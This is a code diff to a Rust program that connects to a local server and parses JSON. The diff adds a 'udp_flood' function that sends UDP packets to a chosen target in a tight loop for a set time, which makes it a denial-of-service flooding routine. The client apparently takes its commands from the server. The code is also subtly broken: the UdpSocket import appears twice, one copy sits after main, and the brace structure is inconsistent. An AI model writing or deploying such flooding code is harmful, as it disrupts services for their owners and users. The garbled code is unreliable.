@@ -1,6 +1,8 @@
 use std::net::{TcpStream, Shutdown};
 use std::io::{Read, Write};
 use serde_json::{Value, from_str};
+use std::net::UdpSocket;
+use std::{time, thread};
 
 fn main() {
     let server_addr = "127.0.0.1:6969"; // TODO: change
@@ -28,6 +30,26 @@ fn main() {
         },
         Err(e) => {
             println!("Failed to connect: {}", e);
+        }
+    }
+}
+
+use std::net::UdpSocket;
+
+fn send_udp(target: &str, message: &str) -> std::io::Result<()> {
+    let socket = UdpSocket::bind("0.0.0.0:0")?; // bind to a random port
+    socket.send_to(message.as_bytes(), target)?;
+    Ok(())
+}
+
+fn udp_flood(target: &str, duration: u64) {
+    let start = time::Instant::now();
+    let message = "A"; // Example message. In a real flood, this would be random or specific data.
+
+    while start.elapsed() < time::Duration::from_secs(duration) {
+        if let Err(e) = send_udp(target, message) {
+            eprintln!("Failed to send UDP packet: {}", e);
+            continue;
         }
     }
 }
